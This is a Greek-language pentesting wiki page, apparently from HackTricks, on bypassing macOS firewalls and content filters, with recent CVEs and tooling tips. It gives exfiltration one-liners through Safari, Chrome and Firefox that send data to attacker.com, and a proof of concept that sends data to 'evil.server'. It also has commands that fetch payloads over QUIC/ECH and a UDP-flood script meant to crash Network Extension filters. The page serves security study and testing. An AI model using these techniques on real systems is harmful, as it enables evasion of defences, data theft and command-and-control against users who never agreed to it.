# Παράκαμψη Firewalls στο macOS

{{#include ../../banners/hacktricks-training.md}}

## Τεχνικές που εντοπίστηκαν

Οι παρακάτω τεχνικές βρέθηκε ότι λειτουργούν σε ορισμένες εφαρμογές firewall του macOS.

### Abusing whitelist names

- Για παράδειγμα, εκτελώντας το malware με ονόματα γνωστών διεργασιών του macOS, όπως το **`launchd`**

### Synthetic Click

- Αν το firewall ζητήσει άδεια από τον χρήστη, κάντε το malware να **κάνει κλικ στο allow**

### **Use Apple signed binaries**

- Όπως το **`curl`**, αλλά και άλλα, όπως το **`whois`**

### Γνωστά apple domains

Το firewall ενδέχεται να επιτρέπει συνδέσεις σε γνωστά apple domains, όπως τα **`apple.com`** ή **`icloud.com`**. Επίσης, το iCloud θα μπορούσε να χρησιμοποιηθεί ως C2.

### Generic Bypass

Μερικές ιδέες για να προσπαθήσετε να παρακάμψετε firewalls

### Έλεγχος επιτρεπόμενης κίνησης

Η γνώση της επιτρεπόμενης κίνησης θα σας βοηθήσει να εντοπίσετε πιθανά whitelisted domains ή ποιες εφαρμογές επιτρέπεται να έχουν πρόσβαση σε αυτά
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Κατάχρηση DNS

Οι επιλύσεις DNS πραγματοποιούνται μέσω της υπογεγραμμένης εφαρμογής **`mdnsreponder`**, η οποία πιθανότατα θα επιτρέπεται να επικοινωνεί με DNS servers.<sup>[1]</sup>

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Μέσω Browser apps

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Μέσω process injections

If you can **inject code into a process** that is allowed to connect to any server, you could bypass the firewall protections:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Πρόσφατα macOS firewall bypass vulnerabilities (2023-2025)

### Παράκαμψη του Web content filter (Screen Time) – **CVE-2024-44206**
Τον Ιούλιο του 2024, η Apple διόρθωσε ένα κρίσιμο bug στο Safari/WebKit, το οποίο επηρέαζε το system-wide “Web content filter” που χρησιμοποιείται από τους γονικούς ελέγχους του Screen Time.
Ένα ειδικά διαμορφωμένο URI (για παράδειγμα, με διπλά URL-encoded “://”) δεν αναγνωρίζεται από το Screen Time ACL, αλλά γίνεται αποδεκτό από το WebKit, με αποτέλεσμα το request να αποστέλλεται χωρίς filtering. Επομένως, οποιοδήποτε process μπορεί να ανοίξει ένα URL (συμπεριλαμβανομένων sandboxed ή unsigned code) μπορεί να αποκτήσει πρόσβαση σε domains που έχουν αποκλειστεί ρητά από τον χρήστη ή από ένα MDM profile.<sup>[2]</sup>

Practical test (un-patched system):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Σφάλμα σειράς κανόνων του Packet Filter (PF) στις πρώιμες εκδόσεις του macOS 14 “Sonoma”
Κατά τον κύκλο beta του macOS 14, η Apple εισήγαγε μια regression στο userspace wrapper γύρω από το **`pfctl`**.
Οι κανόνες που προστέθηκαν με το keyword `quick` (το οποίο χρησιμοποιείται από πολλά VPN kill-switches) αγνοούνταν σιωπηλά, προκαλώντας traffic leaks ακόμη και όταν ένα VPN/firewall GUI εμφάνιζε *blocked*. Το bug επιβεβαιώθηκε από αρκετούς VPN vendors και διορθώθηκε στο RC 2 (build 23A344).

Γρήγορος έλεγχος για leak:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Abusing Apple-signed helper services (legacy – pre-macOS 11.2)
Πριν από το macOS 11.2, το **`ContentFilterExclusionList`** επέτρεπε σε περίπου 50 Apple binaries, όπως τα **`nsurlsessiond`** και το App Store, να παρακάμπτουν όλα τα socket-filter firewalls που υλοποιούνταν με το framework Network Extension (LuLu, Little Snitch κ.λπ.).
Το malware μπορούσε απλώς να κάνει spawn μια excluded process —ή να κάνει inject code σε αυτή— και να κάνει tunnel τη δική του traffic μέσω του socket που είχε ήδη επιτραπεί. Η Apple αφαίρεσε πλήρως τη λίστα εξαιρέσεων στο macOS 11.2, αλλά η τεχνική παραμένει σχετική σε συστήματα που δεν μπορούν να αναβαθμιστούν.<sup>[3]</sup>

Παράδειγμα proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH για παράκαμψη domain filters του Network Extension (macOS 12+)
Οι NEFilter Packet/Data Providers βασίζονται στα TLS ClientHello SNI/ALPN. Με **HTTP/3 over QUIC (UDP/443)** και **Encrypted Client Hello (ECH)**, το SNI παραμένει κρυπτογραφημένο, το NetExt δεν μπορεί να αναλύσει το flow και οι κανόνες hostname συχνά αποτυγχάνουν ανοιχτά (fail-open), επιτρέποντας σε malware να επικοινωνήσει με blocked domains χωρίς να αγγίξει το DNS.<sup>[5]</sup>

Ελάχιστο PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Αν το QUIC/ECH είναι ακόμη ενεργοποιημένο, αυτή είναι μια εύκολη μέθοδος παράκαμψης φίλτρου hostname.

### Αστάθεια του Network Extension στο macOS 15 “Sequoia” (2024–2025)
Οι πρώιμες εκδόσεις 15.0/15.1 προκαλούν crash σε φίλτρα τρίτων του **Network Extension** (LuLu, Little Snitch, Defender, SentinelOne κ.λπ.). Όταν το φίλτρο κάνει restart, το macOS απορρίπτει τους flow rules του και πολλά προϊόντα λειτουργούν σε fail-open mode. Η πλημμύρα του φίλτρου με χιλιάδες σύντομες UDP flows (ή η επιβολή QUIC/ECH) μπορεί να προκαλεί επανειλημμένα το crash και να αφήνει ένα παράθυρο για C2/exfil, ενώ το GUI εξακολουθεί να εμφανίζει ότι το firewall εκτελείται.<sup>[4]</sup>

Γρήγορη αναπαραγωγή (ασφαλές lab box):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Συμβουλές εργαλείων για σύγχρονο macOS

1. Επιθεωρήστε τους τρέχοντες κανόνες PF που δημιουργούν τα GUI firewalls:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Καταγράψτε τα binaries που διαθέτουν ήδη το entitlement *outgoing-network* (χρήσιμο για piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Καταχωρίστε προγραμματιστικά το δικό σας Network Extension content filter σε Objective-C/Swift.
Ένα minimal rootless PoC που προωθεί packets σε ένα local socket είναι διαθέσιμο στον source code του **LuLu** του Patrick Wardle.

## Αναφορές

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Δημιουργία και παραβίαση macOS Firewalls](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Το Apple web content filter bypass επιτρέπει unrestricted access σε blocked content (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Η Apple αφαιρεί macOS feature που επέτρεπε σε apps να κάνουν bypass το Firewall Security - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Cybersecurity Products Conking Out μετά το macOS Sequoia Update - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Χρησιμοποιήστε network protection για να αποτρέψετε macOS connections σε bad sites - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
